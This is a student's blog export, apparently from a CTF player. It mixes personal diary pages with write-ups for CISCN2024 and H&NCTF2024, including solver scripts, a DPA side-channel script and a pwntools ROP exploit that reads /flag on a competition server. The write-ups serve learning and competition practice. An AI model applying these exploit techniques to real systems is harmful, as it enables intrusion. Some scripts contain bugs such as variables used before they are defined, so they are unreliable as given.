{"meta":{"title":"Pinguw's Blog","subtitle":"","description":"","author":"Pinguw","url":"http://example.com","root":"/"},"pages":[{"title":"关于博主","date":"2024-05-22T07:20:14.461Z","updated":"2024-05-22T07:20:14.461Z","comments":true,"path":"aboutme.html","permalink":"http://example.com/aboutme.html","excerpt":"","text":"小时候打喷嚏，总觉得是谁在偷偷想自己。现在看来，说不定是长大的自己在想念小时候的自己。 2023年8月 - 刚得知自己考上大学就稀里糊涂地被拉去打了新生赛。（那时候的我还不知道自己已经踏上了一条不归路） 2023年10月 - 新生赛的征程结束，大家都各自选好了自己的方向，即使到现在我也不知为何会选择在逆向上走下去。我队已经3年没人做逆向了，不妨把这算作一条理由罢。 2023年11月 - 首次参加企业比赛HWS，虽然最后的奖金只有300米，但也是一次极棒的体验和学习经历。 2024年3月 - 我大抵是完全放弃了深造下去的念头。唉，但是谁不想读研啊，我也想学习啊。。。 2024年4月13日 - 校赛，其中五道逆向，斩获四道一血，一道二血，算是不负众望吧。 2024年4月 - Pinguw加入HASHTEAM！！！ 2024年4月17日 - 跟着其他队员首次接触到AWD模式，然鹅只有挨打的份。说实话，即使是什么也不会（只能改个弱口令），也能真切地感受到这个比赛模式的紧张与刺激。也是，AWD里，逆向手又能做什么呢？ 2024年4月21日 - 成功加入山东大学镜像站，负责后端开发。第一个任务是…五一前把现在的后端看完。 2024年5月13日 - 带队拿到首奖，大家辛苦了（补一句；社工真好玩，社不出来不好玩）。 2024年5月18日、19日 - 首次CISCN（CTF国赛），承担了全队的re出题，虽然水平还是不够，但还是够得上各方向的平均数吧。"},{"title":"赞助我","date":"2024-04-14T07:57:37.833Z","updated":"2024-04-14T07:57:37.833Z","comments":true,"path":"donate.html","permalink":"http://example.com/donate.html","excerpt":"","text":"不必赞助我了，把钱留给自己和父母吧，学会爱自己，也要记得，及时报养育之恩。"},{"title":"我的朋友","date":"2024-04-14T10:02:41.213Z","updated":"2024-04-14T10:02:41.213Z","comments":true,"path":"friends.html","permalink":"http://example.com/friends.html","excerpt":"","text":"我们会慢慢长大成人，随着季节的不停变换路边盛开的鲜花也在不断变化，那个季节盛开的鲜花到底叫什么名字，轻轻摇曳着一旦触摸它就会轻轻地被扎到，用鼻子靠近闻一闻，会有一股淡淡的青涩太阳的芳香，随着那股香味慢慢变淡我们也在长大成人，但是那朵花一定会在某处继续盛开。 朋友们每次编译时，随机排序"},{"title":"文章归档","date":"2024-04-11T13:54:27.378Z","updated":"2024-04-11T13:54:27.378Z","comments":true,"path":"archives.html","permalink":"http://example.com/archives.html","excerpt":"","text":""},{"title":"","date":"2024-04-22T10:15:49.517Z","updated":"2024-04-22T10:15:49.517Z","comments":true,"path":"diary/essay.html","permalink":"http://example.com/diary/essay.html","excerpt":"","text":"2024-4-15“一次错过不算错误，错在来不及看清楚你的面目我就交出全部”——周深《春雪》 2024-4-16有一个喜欢的人真的太重要了，在你打算稀里糊涂过这普普通通的一生的时候，会因为对方而再想努力一下，在那么多疲惫不堪甚至抬不起头的日子，会因为对方而觉得人生还有盼头。 ——村上春树 2024-4-18四月开满蓝花楹，满城尽是紫花香。 蓝花楹的花语是：“在绝望中等待爱情，你来或不来它都在枝头绽放，在绝望中永恒等待”。 但是，不要等待爱情来拯救绝望的自己。 2024-4-20上船不思岸上人，下船不提船上事，旧人无需知近况，新人不必思过往。 人生聚散本事常事，一念执着万般皆苦，一念放下便是重生。 往者不可谏，来者犹可追 2024-4-21花和人都会遇到各种各样的不幸，但生命的长河是无止境的。 我一直认为，两个人之间最亲密的事不是牵手亲嘴，而是在对方面前掉眼泪。 人，一旦心寒了，就再也不会对你长篇大论了，言语会变得剪短，目光会变得冷淡。除了沉默，就是冷漠。 2024-4-22我动了离开你的念头，不是因为你不好，也不是因为我不爱你了，而是你对我的态度，让我感觉你的世界并不缺少我。 ——村上春树"},{"title":"","date":"2024-05-14T02:14:51.352Z","updated":"2024-05-14T02:14:51.352Z","comments":true,"path":"lookhere/nothing.html","permalink":"http://example.com/lookhere/nothing.html","excerpt":"","text":"我确实想，你但不能打扰你，不是你不重要而是我觉得你的世界行不需要我了，是我没本事，没能走进你的心里，人不能既要又要还要，太贪心会进黑名单。 遇到黄灯总是不知道该冲还是该停，冲的是侥幸，停的是自知，黄灯和你都是我数不清的犹豫。 遇人不淑，放手就是进步，越是苦苦纠缠就越是罪孽深重。 无论他表现出多少的不舍，表现出多少纠结和痛苦，只要是轻易的放弃了你，那这个人就一定不爱你。 我们已经过了耳听爱情的年纪，学聪明点，不要为不珍惜你的人却浪费青春。 人家都不想理你了，你给了你明确的态度就等你识相自己离开，你还执迷不悟，知不知道你卑微的样子好丢人啊。 当失望寒心消灭热情时应该明白，无论你如何渴望过去，那里都没有你的未，你将过去抱的太紧，怎么能腾得出手拥抱现在，又怎么面向未来？ 你动了离开的念头，不是因为你不好，也不是不爱了，而是你对我的态度，让我觉得你的世界并不缺我，其实我可以厚着脸你再去纠缠，再也没有意义。 是，挺好的，从满心欢喜到绝望，她耗尽了你所有的美好的热情。 让你失望的人怎么可能只让你失望一次，人是不会愧疚的，遇见更好的，谁会记得你？不要被廉价的言语说感动毕竟说话不需要成本。人教人，教不会；事教人，一次就好。吃亏和吃饭一样，吃多了就会成长。 她求我放过他的时候，我突然愣住了，我明明记得那天晚上她说遇见我，她花光了所有的运气，以后都不能轻言放手，他哭着让我不要再联络他的时候，我也突然想起他曾经坚定地告诉我以后的日子无论发生什么？都不要放弃她。 从不随便牵手更不随便放手，时间不等人，等你的是我，但爱情也好友情也罢，你都不会再遇到第二个我，千万别等这朵花快要枯萎了你才知道要及时。 他知道你在等他他知道你很喜欢他，他知道你没办法放弃他，所有的一切他都明白，可他就是不要你，好不容易心动一次，他却让你输得这么彻底？ 你为什么总是拿很长的时间去证实一个一开始就知道结果的事。 我终于熬过那段看谁都像你，看什么都想你，听的歌全都关于你的日子？很庆幸我终于可以顺利的不问归期不再联系，不再等你。"},{"title":"","date":"2024-05-22T07:44:27.385Z","updated":"2024-05-22T07:44:27.385Z","comments":true,"path":"diary/2024年第一份月报.html","permalink":"http://example.com/diary/2024%E5%B9%B4%E7%AC%AC%E4%B8%80%E4%BB%BD%E6%9C%88%E6%8A%A5.html","excerpt":"","text":"5.1-5.5刚从失落中逃出来，恰好是五一可以休整一下。原本也是没想回家的，但爸妈来青玩，顺便也给我接回去。 看一下五一山青旁边的滨海公园： 回家后没什么好说的，睡觉+打游戏循环，偶尔被拉过去打打工做几道re。 当然，做做水题罢了，遇到难题直接开摆。 get到一个新游戏，永劫真好玩。 5.9放完假回来更不想上课了，今天实在困得不行连从不敢逃的高数都不去上了。（又打了一天劫） 明天是校运会，冲掉了一天课，本来想着去济南，可惜朋友很忙没空带我转转，有机会再去。 5.12-5.19中间断更的几天没什么好写的，就是上班+打劫。 然后就是比赛、比赛、比赛，无休止的比赛，我还以为上课打H&amp;N已经够离谱了，没想到这两天的国赛强度更大，先不说做不做得出来，就是搁那坐着不能看QQ就挺折磨了。 5.22高数老师换成之前那个不点名的了，现在平均每周两三节课了（ 上课是不可能上课的，反正都是突击复习一下就能过的东西，学好了说实话也没什么用。"},{"title":"","date":"2024-05-14T02:21:32.047Z","updated":"2024-04-22T13:00:16.978Z","comments":true,"path":"lookhere/n0th1ng.html","permalink":"http://example.com/lookhere/n0th1ng.html","excerpt":"","text":"3月25日第一次见面，我们都既高兴又紧张，虽然因为我一直在忙改稿子，没有及时地回你消息，惹你不开心了， 但是那天晚上我们在一起听歌，聊到很晚，还是很开心。 4月8日下午那节课我们是分开坐的，好想跟你聊天但却你不太理我， 去上晚课前你又突然说不载我去了。我似乎看得出来你是在说谎，虽然我不知道为什么。当时真的很伤心。。。 估摸你快下楼时，我提早在不远处盯着你的车子等你过来，看到一身红衣，我也默默走近。 你用另一个谎言来弥补上一个谎言（可能是谎言吧），我没有说话，但你却流下了眼泪，我那时心都快碎了。 我一直认为，两个人之间最亲密的事不是牵手亲嘴，而是在对方面前掉眼泪。 至今我还不知道你为什么哭，但是这着实给我心中烙下了很深的印记， 我不想让你再一次流泪，起码不要因为我说的话太过无理。 4月15日很长一段时间内最开心的一天， 那天没什么特别的，只是你就在我旁边，即使没有张口，但是依旧聊了很多很多。 其实这已经够特别了。 4月16日你要我去给你送充电宝，我很开心我能帮得上你，你有困难也能想起我。 我赶紧从床上爬起来，收拾好自己一路小跑赶上最近的一班校车，撒个小谎告诉你我也在上课， 你用完充电宝之后非要马上还回来，可是我走的太早惹得你有一点不开心， 本以为你也只是跟平常一样发发小性子，我也同样惯着你呗，没什么大不了的。 可是从那天下午开始， 变成了我发几十条消息都换不来你一句应付的回复， 你明明在群里有说有笑，却装作看不见我一样，甚至在mc群里也是。。 我真的非常伤心，说了一些话， 那些话在你看来是很不讲理的，你看了很不舒服，很不开心， 然后就是生气-&gt;不回消息-&gt;我继续乱想-&gt;我发一些不好的话-&gt;你继续生气， 恶性循环， 见线上找不得你，我便找尽机会想线下跟你聊聊， 因为之前每次见你的时候你都是很开心，额不，起码是不会真生气的。 其实你讨厌的叹气，只是你在我旁边我紧张地深呼吸； 其实你讨厌我拽你，只是我抱怨一节课怎么这么短，想留住你多跟你待一会而已。 但是4月20号周五和4月21号周六的两次， 你对我展现出的是…一种十分厌恶的态度， 尤其是周六你比赛的时候， 我本想去给你加油， 可是，“不要影响我打比赛的心情！” 我意识到， 哦， 可能我再继续找你就是个错误， 我是真的打扰到你的正常生活了。。 只是你没有说出口而已。 那天离开体育馆后，我一整天都浑浑噩噩， 下午的比赛根本没法子打， 我开始试着不再去联系你。。。 我之前那个活泼，可爱，开朗，话也多，性格也好，又爱笑，又喜欢跟我一起玩的桦到底去哪了！！！天哪，快还给我！！！ 是从3月27日开始的！那天高数期中考试之后， 你回消息的频率变少了，也不喜欢开玩笑了，更不玩游戏了，脾气也开始变得不好，动不动你就生气，就凶我，我当然认为这是你在忙，在耍小性子之类的， 尤其是那天你哭着说的“我最近比较忙，可能情绪不太稳定…” 我在等：你闲下来，是不是就能变回去了？ 我还能在你不回消息的情况下继续坚持下去全凭： 可是事态越来越不对劲，你的这些变化越来越明显，简直就像是变了一个人！ 随后就发生了上面的故事 …… 我真的真的很想找一个机会，咱们两个能面对面地聊一聊天，复盘一下上面的故事，解开这些矛盾。 可， 我连在QQ上跟你聊上天的机会都如此渺茫。。。 你在樱花将开之时到来， 我不想让你在樱花落尽之际就走， 这样的SakuRa太过短暂了， 留给我很多痛苦的回忆。 我不想这样…… 可我又如何去改变呢…… 跟你在一起那些很开心的经历我并没有记下来， 因为我觉得，我们以后会有更多开心的经历，希望如此。"}],"posts":[{"title":"CISCN2024","slug":"比赛WP/CISCN2024","date":"2024-05-22T07:21:02.000Z","updated":"2024-05-22T07:30:49.172Z","comments":true,"path":"2024/05/22/比赛WP/CISCN2024/","permalink":"http://example.com/2024/05/22/%E6%AF%94%E8%B5%9BWP/CISCN2024/","excerpt":"","text":"Reverseasm_re拿到手是IDA的view界面， main函数逻辑交给GPT，是简单的加减乘除异或， data段手动dump出+解密： 12345678910111213141516171819202122232425262728293031323334353637383940data = [ 0xD7, 0x1F, 0x00, 0x00, 0xB7, 0x21, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x27, 0x20, 0x00, 0x00, 0xE7, 0x26, 0x00, 0x00, 0xD7, 0x10, 0x00, 0x00, 0x27, 0x11, 0x00, 0x00, 0x07, 0x20, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xF7, 0x11, 0x00, 0x00, 0x07, 0x20, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x17, 0x1F, 0x00, 0x00, 0xD7, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0x67, 0x1F, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0xC7, 0x11, 0x00, 0x00, 0x17, 0x10, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x17, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x47, 0x0F, 0x00, 0x00, 0x27, 0x11, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0x47, 0x1E, 0x00, 0x00, 0x37, 0x10, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0xD7, 0x1F, 0x00, 0x00, 0x07, 0x11, 0x00, 0x00, 0x87, 0x27, 0x00, 0x00]print(len(data) // 4)tmp = &#x27;&#x27;for i in range(0, len(data), 4): if(len(hex(data[i])[2:]) == 1): tmp = &#x27;0&#x27; + hex(data[i])[2:] else: tmp = hex(data[i])[2:] print(&#x27;0x&#x27;, hex(data[i + 1])[2:], tmp, sep = &#x27;&#x27;, end = &#x27;, &#x27;)print()flag = [0x1fd7, 0x21b7, 0x1e47, 0x2027, 0x26e7, 0x10d7, 0x1127, 0x2007, 0x11c7, 0x1e47, 0x1017, 0x1017, 0x11f7, 0x2007, 0x1037, 0x1107, 0x1f17, 0x10d7, 0x1017, 0x1017, 0x1f67, 0x1017, 0x11c7, 0x11c7, 0x1017, 0x1fd7, 0x1f17, 0x1107, 0xf47, 0x1127, 0x1037, 0x1e47, 0x1037, 0x1fd7, 0x1107, 0x1fd7, 0x1107, 0x2787]for i in range(38): print(chr((((flag[i] - 30) ^ 70) - 20) // 80), end = &#x27;&#x27;) flag{67e9a228e45b622c2992fb5174a4f5f5} androidso_re从jadx中看到是CBC的DES， ![jadx](E:&#x2F;Pinguw’s Blog&#x2F;source&#x2F;_posts&#x2F;比赛WP&#x2F;CISCN2024&#x2F;jadx.png) 进so看getkey和getiv的加密方式， key是简单的RC4加异或，iv是凯撒密码。 key: ![key](E:&#x2F;Pinguw’s Blog&#x2F;source&#x2F;_posts&#x2F;比赛WP&#x2F;CISCN2024&#x2F;key.png) iv: ![iv1](E:&#x2F;Pinguw’s Blog&#x2F;source&#x2F;_posts&#x2F;比赛WP&#x2F;CISCN2024&#x2F;iv1.png) ![iv2](E:&#x2F;Pinguw’s Blog&#x2F;source&#x2F;_posts&#x2F;比赛WP&#x2F;CISCN2024&#x2F;iv2.png) 对key和iv的解密： 12345678910111213141516RC4_key = [0x42, 0xb1, 0x66, 0xdc, 0x03, 0x6d, 0x45, 0x1b, 0xc2, 0x3b, 0x58, 0xba]xor_key = [0x03, 0x89, 0x33, 0xB8, 0x54, 0x0C, 0x20, 0x6A]for i in range(len(xor_key)): print(chr(RC4_key[i + k] ^ xor_key[i]), end = &#x27;&#x27;)print()enc_iv = &quot;F2IjBOh1mRW=&quot;for i in enc_iv: if(i.islower()): print(chr(ord(&#x27;a&#x27;) + (ord(i) - 81) % 26), end = &#x27;&#x27;) elif(i.isupper()): print(chr(ord(&#x27;A&#x27;) + (ord(i) - 49) % 26), end = &#x27;&#x27;) else: print(i, end = &#x27;&#x27;) DES的解密： ![des](E:&#x2F;Pinguw’s Blog&#x2F;source&#x2F;_posts&#x2F;比赛WP&#x2F;CISCN2024&#x2F;des.png) flag{188cba3a5c0fbb2250b5a2e590c391ce} gdb_debug![debug1](E:&#x2F;Pinguw’s Blog&#x2F;source&#x2F;_posts&#x2F;比赛WP&#x2F;CISCN2024&#x2F;debug1.png) ![debug2](E:&#x2F;Pinguw’s Blog&#x2F;source&#x2F;_posts&#x2F;比赛WP&#x2F;CISCN2024&#x2F;debug2.png) 动调出两处xor_key和一个sbox，然后写代码解密： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798# XORenc_flag = [0xBF, 0xD7, 0x2E, 0xDA, 0xEE, 0xA8, 0x1A, 0x10, 0x83, 0x73, 0xAC, 0xF1, 0x06, 0xBE, 0xAD, 0x88, 0x04, 0xD7, 0x12, 0xFE, 0xB5, 0xE2, 0x61, 0xB7, 0x3D, 0x07, 0x4A, 0xE8, 0x96, 0xA2, 0x9D, 0x4D, 0xBC, 0x81, 0x8C, 0xE9, 0x88, 0x78, 0x00, 0x00,]key = &quot;congratulationstoyoucongratulationstoy&quot;for i in range(38): enc_flag[i] ^= ord(key[i])#==============================================================================# XORc = [0x03, 0x12, 0x0C, 0x4C, 0xC6, 0x26, 0x8C, 0x63, 0xB6, 0x87, 0xB0, 0x6F, 0x1A, 0xCB, 0x9B, 0xFD, 0xBC, 0x52, 0x79, 0x93, 0x19, 0x6A, 0xDA, 0x4E,0x7B, 0xF9, 0xC4, 0xBB, 0xF1, 0x7E, 0x9D, 0x1E,0x44, 0xD6, 0xC5, 0x50, 0xBF, 0xEE, 0x00, 0x00,]d = [0xDD, 0xB8, 0x4E, 0xB0, 0xCF, 0xCE, 0x3E, 0x65,0xBB, 0x14, 0xD1, 0x9B, 0x3E, 0x82, 0x8E, 0xFC,0x6B, 0xF9, 0x7D, 0x8B, 0xD6, 0x83, 0x0F, 0xD8,0x48, 0x33, 0x3D, 0x91, 0xAF, 0x94, 0xB0, 0x22,0xD0, 0xB9, 0xFD, 0xCD, 0xE7, 0x04, 0x00, 0x00,]# for i in c:# for j in range(15, -1, -2):# print(&#x27;0x&#x27;+i[j - 1]+i[j]+&#x27;, &#x27;, end = &#x27;&#x27;)# print()# print()# for i in d:# for j in range(15, -1, -2):# print(&#x27;0x&#x27;+i[j - 1]+i[j]+&#x27;, &#x27;, end = &#x27;&#x27;)# print()xor_key2 = [0] * 38for i in range(38): xor_key2[i] = c[i] ^ d[i]for i in range(38): enc_flag[i] ^= xor_key2[i]#==============================================================================# ENCs_box = [0x12, 0x0E, 0x1B, 0x1E, 0x11, 0x05, 0x07, 0x01, 0x10, 0x22, 0x06, 0x17, 0x16, 0x08, 0x19, 0x13, 0x04, 0x0F, 0x02, 0x0D, 0x25, 0x0C, 0x03, 0x15,0x1C, 0x14, 0x0B, 0x1A, 0x18, 0x09, 0x1D, 0x23,0x1F, 0x20, 0x24, 0x0A, 0x00, 0x21, 0x00, 0x00,]# for i in s_box:# for j in range(15, -1, -2):# print(&#x27;0x&#x27;+i[j - 1]+i[j]+&#x27;, &#x27;, end = &#x27;&#x27;)# print()flag = [0] *38for i in range(38): flag[s_box[i]] = enc_flag[i]#==============================================================================# XORa = r&quot;flag&#123;0123456789abcdef0123456789abcdef&#125;&quot;b = [0xBF, 0x63, 0x79, 0xDA, 0xBC, 0x26, 0xB0, 0x8C, 0xCB, 0x7E, 0x50, 0xC4, 0x6A, 0x93, 0x12, 0x52, 0xB6, 0xC6, 0x03, 0xFD, 0xF9, 0x4E, 0x1A, 0x6F,0xF1, 0x9B, 0xBB, 0x0C, 0x7B, 0x9D, 0x4C, 0x44,0xD6, 0xEE, 0x87, 0x1E, 0xC5, 0x19, 0x00, 0x00,]# for i in b:# for j in range(15, -1, -2):# print(&#x27;0x&#x27;+i[j - 1]+i[j]+&#x27;, &#x27;, end = &#x27;&#x27;)# print()for i in range(38): xor_key1[i] = ord(a[i]) ^ b[i]for i in range(38): flag[i] ^= xor_key1[i]xor_key1 = [0] * 38#==============================================================================for i in range(38): print(chr(flag[i]), end = &#x27;&#x27;) flag{78bace5989660ee38f1fd980a4b4fbcd} CryptoOvO首先把kk和rr求出来，我们构造格来求解 123456789101112131415from Crypto.Util.number import *n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823E=e-65537-1L=[2^512,E,0,n]L=matrix(ZZ,2,2,L)L=L.LLL()print(E.nbits())print(L[0][-1].nbits())t=L[0][-1]-Err=t/nprint(abs(rr)) 然后将其代入方程中，利用coppersmith定理求解出q，最后得到pq再代入计算e，从而求解d进行解密 1234567891011121314151617181920212223242526272829303132333435T=E-rr*(n+1)print(T)F.&lt;x&gt;=PolynomialRing(Zmod(n))a=kk+rrb=rrT_=isqrt(T^2-4*a*b*n)print(T_)f=T-T_-xprint(&quot;test&quot;,T-T_)f=f.monic()res=f.small_roots(X=2^220,beta=0.48,epsilon=0.03)print(res)e_=3068983976454588482130615663363179725530249819246943896851073r=T-T_-e_print(e_.nbits())print(gcd(r,n))q=11287710353955888973017088237331029225772085726230749705174733853385754367993775916873684714795084329569719147149432367637098107466393989095020167706071637p=n//qassert p*q==nprint(&quot;p=&quot;,p)print(&quot;q=&quot;,q)print(&quot;kk=&quot;,kk)print(&quot;rr=&quot;,rr)print(p*q)print(n)e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1d=inverse_mod(e,(p-1)*(q-1))print(long_to_bytes(int(pow(c,d,n)))) 古典密码经过尝试，这是挺过atbash加密的base64编码，我们解密一下 得到一串字符，显然是通过栅栏加密的，我们再解密 于是得到了flag Misc火锅链观光打卡安装MetaMost拓展后连上题目的网站然后答对7到题就会出现一张旋转的图片，上面有flag Power_Trajectory_Diagram分析npz文件，将数据发给gpt，让gpt写出DPA功耗攻击代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import numpy as npimport matplotlib.pyplot as pltfrom scipy.stats import pearsonr# 加载npz文件data = np.load(&#x27;power_traces.npz&#x27;)# 提取数据index = data[&#x27;index&#x27;]input_data = data[&#x27;input&#x27;]trace = data[&#x27;trace&#x27;]# 设定密码长度password_length = 13# 按index分组grouped_traces = &#123;&#125;grouped_inputs = &#123;&#125;for i in range(len(index)): idx = index[i] if idx not in grouped_traces: grouped_traces[idx] = [] grouped_inputs[idx] = [] grouped_traces[idx].append(trace[i]) grouped_inputs[idx].append(input_data[i])# 初始化存储推测结果的字典hypothetical_keys = &#123;&#125;for idx in range(password_length): hypothetical_keys[idx] = []# 定义一个简单的DPA分析函数def dpa_analysis(grouped_traces, grouped_inputs): for idx in range(password_length): traces = np.array(grouped_traces[idx]) inputs = np.array(grouped_inputs[idx]) max_corr = -1 best_guess = None # 针对每个可能的字符进行假设 for guess in set(inputs): # 假设密钥猜测 hypothetical = np.array([1 if char == guess else 0 for char in inputs]) # 计算假设的中间值 mean_hypothetical = hypothetical.mean() diff = hypothetical - mean_hypothetical # 计算每个时间点上的功耗与假设的相关性 for t in range(traces.shape[1]): corr, _ = pearsonr(traces[:, t], diff) if abs(corr) &gt; max_corr: max_corr = abs(corr) best_guess = guess hypothetical_keys[idx].append(best_guess) print(f&quot;Best guess for position &#123;idx&#125;: &#123;best_guess&#125;&quot;)# 运行DPA分析dpa_analysis(grouped_traces, grouped_inputs)![alt text](image-16.png)# 打印最终推测的密码cracked_password = &#x27;&#x27;.join([hypothetical_keys[idx][0] for idx in range(password_length)])print(&quot;Cracked password:&quot;, cracked_password)# 可视化部分密码位的平均功耗轨迹plt.figure(figsize=(12, 6))for idx in range(password_length): plt.plot(np.mean(grouped_traces[idx], axis=0), label=f&#x27;Position &#123;idx&#125;&#x27;)plt.legend()plt.title(&#x27;Average Power Traces for Different Password Positions&#x27;)plt.xlabel(&#x27;Time&#x27;)plt.ylabel(&#x27;Power Consumption&#x27;)plt.show() 神秘文件part1 Part1:flag{e part2 part2:675efb part3得到vba代码： 1234567891011121314151617181920212223242526272829303132333435363738394041Sub crypto(sMessage, strKey) Dim kLen, x, y, i, j, temp Dim s(256), k(256) kLen = Len(strKey) For i = 0 To 255 s(i) = i k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) Next j = 0 For i = 0 To 255 j = (j + k(i) + s(i)) Mod 256 temp = s(i) s(i) = s(j) s(j) = temp Next x = 0 y = 0 For i = 1 To 3072 x = (x + 1) Mod 256 y = (y + s(x)) Mod 256 temp = s(x) s(x) = s(y) s(y) = temp Next For i = 1 To Len(sMessage) x = (x + 1) Mod 256 y = (y + s(x)) Mod 256 temp = s(x) s(x) = s(y) s(y) = temp crypto = crypto &amp; (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) &amp; &quot;,&quot; Next &#x27;i13POMdzEAzHfy4dGS+vUA==(After base64)End Sub 上网搜索发现是rc4，在cyberchef密码没输直接出了 PArt3:3-34 part4 PaRt4:6f-40 part5 Vm1wR1UxRXhXWGhUV0d4WFlrZG9WMWxVUm1GWFJscHlWMjVrVmxKc2NIaFZiVFZQVkd4S2MxSnFVbGRXTTFKUVdWVmtVMDVyTVVWaGVqQTk&#x3D;N round Base64 pArt5:5f-90d part6 ParT6:d-2 part7 PART7&#x3D;22b3 part8 paRt8:87e part9 parT9:dee part10 PARt10:9} flag{e675efb3-346f-405f-90dd-222b387edee9} 大学生安全测试能力调研问卷问卷题 Pwngostackida里找一个syscall；ret。 动调得到偏移 通过syscall打orw 12345678910111213141516171819202122232425262728293031323334353637from pwn import *from time import sleepcontext(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)c = remote(&#x27;8.147.131.176&#x27;,14064)#c = process(&#x27;./pwn&#x27;)#gdb.attach(c,&#x27;b *0x4a0a28&#x27;)offset = cyclic(464)heap = 0x564000pop_rdi = 0x4a18a5pop_rax = 0x40f984pop_rsi = 0x42138apop_rdx = 0x4944ecsyscall = 0x4616c9main = 0x4a0ac0p1 = p64(pop_rdi) + p64(0) + p64(heap)*5 + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(8) + p64(pop_rax) + p64(0) + p64(syscall) #read /flag\\0p2 = p64(pop_rdi) + p64(heap) + p64(heap)*5 + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall)#open(/flag,0,0)p3 = p64(pop_rdi) + p64(3) + p64(heap)*5 + p64(pop_rsi) + p64(heap+8) + p64(pop_rdx) + p64(0x30) + p64(pop_rax) + p64(0) + p64(syscall) #read(3,heap+8,0x30)p4 = p64(pop_rdi) + p64(1) + p64(0)*5 + p64(pop_rsi) + p64(heap+8) + p64(pop_rdx) + p64(0x30) + p64(pop_rax) + p64(1) + p64(syscall)#write(1,heap+8,0x30)p = b&#x27;a&#x27;*0x100 + p64(0xc0000160b0) + p64(0x8) + p64(0x49136a) + p64(0x549e80)p = p.ljust(464,b&#x27;a&#x27;)c.sendline(p + p1 + p2 + p3 + p4)sleep(0.1)c.sendline(&#x27;/flag\\0&#x27;)c.interactive()#0x00000000004a18a5 : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret#0x000000000040f984 : pop rax ; ret#0x00000000004944ec : pop rdx ; ret#0x000000000042138a : pop rsi ; ret#000000000404043 : syscall#read(0,heap,8) rax=0 ,rdi=0,rsi=heap,rdx=8 得到flag","categories":[{"name":"比赛WP","slug":"比赛WP","permalink":"http://example.com/categories/%E6%AF%94%E8%B5%9BWP/"}],"tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"}]},{"title":"H&NCTF2024","slug":"比赛WP/H&NCTF2024","date":"2024-05-13T15:48:29.000Z","updated":"2024-05-13T16:20:12.252Z","comments":true,"path":"2024/05/13/比赛WP/H&NCTF2024/","permalink":"http://example.com/2024/05/13/%E6%AF%94%E8%B5%9BWP/H&NCTF2024/","excerpt":"","text":"Reverse-Baby_OBVBS打开之后看见是VBS混淆，将混淆部分打印出来（base64内容部分略去）： 123456789101112131415161718192021222324252627eAqi = &quot;59fc6b263c3d0fcbc331ade699e62d3473bbf85522d588e3423e6c751ca091528a3c0186e460483917192c14&quot;ANtg = &quot;baacc7ffa8232d28f814bb14c428798b&quot;Function Base64Decode(base64EncodedString) Dim xml, elem Set xml = CreateObject(&quot;MSXML2.DOMDocument&quot;) Set elem = xml.createElement(&quot;tmp&quot;) elem.dataType = &quot;bin.base64&quot; elem.text = base64EncodedString Dim stream Set stream = CreateObject(&quot;ADODB.Stream&quot;) stream.Type = 1 &#x27;Binary stream.Open stream.Write elem.nodeTypedValue stream.Position = 0 stream.Type = 2 &#x27;Text stream.Charset = &quot;utf-8&quot; Base64Decode = stream.ReadText stream.CloseEnd Functionnbbt=&quot;RnVuY3Rpb24gSW5pdGlhbGl6ZShzdHJQd2QpDQogICAgRGltIGJveCgyNTYpDQogICAgRGltIHRlbXBTd2FwDQogICAgRGltIGENCiAg&quot;execute base64Decode(nbbt)NFqt=&quot;RnVuY3Rpb24gTXlmdW5jKHNZCBGdW5jdGlvbg==&quot;execute base64Decode(NFqt)NsFw=&quot;RnVuY3Rpb24gRWNTYpDQogICAgICAgIGVuY3J5cHRlZERhdGEgPSBlbmNyeXB0ZWREYXRhICYgTENhc2UoUmlnaHQoIjAiICYgSGV4KHkpLCAyKSkNCiAgICBOZXh0DQogICAgRW5DcnlwdCA9IGVuY3J5cHRlZERhdGENCkVuZCBGdW5jdGlvbg==&quot;execute base64Decode(NsFw)hYLu=&quot;bXNnYm94ICJEbyB5b3Uga28gImJ5ZSEi&quot;execute base64Decode(hYLu) base64解密后得到加密代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798Function RC4_init(strPwd) Dim box(256) Dim tempSwap Dim a Dim b For i = 0 To 255 box(i) = i Next a = 0 b = 0 For i = 0 To 255 a = (a + box(i) + Asc(Mid(strPwd, (i Mod 